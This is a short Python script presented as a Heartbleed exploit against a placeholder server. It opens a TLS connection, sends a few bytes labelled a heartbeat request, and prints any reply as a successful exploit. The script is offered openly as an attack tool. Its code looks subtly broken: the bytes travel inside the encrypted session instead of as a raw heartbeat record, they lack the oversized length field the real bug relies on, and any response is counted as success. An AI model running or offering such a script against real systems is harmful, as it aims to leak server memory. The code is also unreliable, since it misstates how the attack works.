import socket
import ssl

def heartbleed_exploit(host, port):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    
    # Wrap the socket with SSL/TLS
    ssl_sock = ssl.wrap_socket(s)
    
    # Connect to the server
    ssl_sock.connect((host, port))
    
    # Send a TLS heartbeat request
    heartbeat_request = b"\x18\x03\x01\x00\x01\x01"
    ssl_sock.send(heartbeat_request)
    
    # Receive the response
    response = ssl_sock.recv(1024)
    
    # Close the connection
    ssl_sock.close()
    
    return response

# Example usage
host = "vulnerable-server.com"
port = 443

try:
    response = heartbleed_exploit(host, port)
    print("[+] Exploit successful. Received response:")
    print(response)
except Exception as e:
    print("[-] Exploit failed:", str(e))
